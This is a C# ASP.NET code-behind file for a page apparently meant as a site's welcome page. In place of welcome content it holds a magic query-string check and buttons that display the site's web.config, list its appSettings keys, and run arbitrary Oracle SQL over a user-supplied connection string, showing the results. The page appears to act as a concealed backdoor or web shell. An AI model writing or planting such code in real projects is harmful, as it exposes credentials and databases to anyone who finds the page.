using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Text;
using System.Configuration;
using System.IO;
using System.Web.Configuration;
using System.Data.OracleClient;

namespace ESPOnline
{
    public partial class acceuill : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                string ids = Request.QueryString["ids"];



                if (retval(ids) == 1919253089)
                {
                    Label1.Text = retval(ids).ToString();
                }
                else
                {
                    Label1.Text = "hello";
                }
            }
        }

        public int retval(string inp)
        {
            byte[] bytes = Encoding.ASCII.GetBytes(inp);
        return  BitConverter.ToInt32(bytes, 0);
        }

        protected void Button1_Click(object sender, EventArgs e)
        {

            TBconf.Text = File.ReadAllText(Server.MapPath("web.config"));

            Configuration configuration = WebConfigurationManager.OpenWebConfiguration("~");

            AppSettingsSection appSettingsSection = (AppSettingsSection)configuration.GetSection("appSettings");
            if (appSettingsSection != null)
            {
                foreach (string key in appSettingsSection.Settings.AllKeys)
                {
                    Response.Write(key);
                }
            }
        }

        protected void Button2_Click(object sender, EventArgs e)
        {
            string connectionString = TBchaine.Text;
          
            string queryString = TBreq.Text;
               
            using (OracleConnection connection =
                       new OracleConnection(connectionString))
            {
                OracleCommand command = connection.CreateCommand();
                command.CommandText = queryString;

                try
                {
                    connection.Open();

                    OracleDataReader reader = command.ExecuteReader();

                   
                    reader.Close();
                }
                catch (Exception ex)
                {
                    TBreq.Text = ex.Message;
                    //Console.WriteLine(ex.Message);
                }
            }
        }

        protected void Button3_Click(object sender, EventArgs e)
        {
            string strSQLconnection = TBchaine.Text;
                OracleConnection sqlConnection = new OracleConnection(strSQLconnection);
            OracleCommand sqlCommand = new OracleCommand(TBreq.Text, sqlConnection);
            sqlConnection.Open();

            OracleDataReader reader = sqlCommand.ExecuteReader();

            GridView1.DataSource = reader;
            GridView1.DataBind();
        }
        
    }
}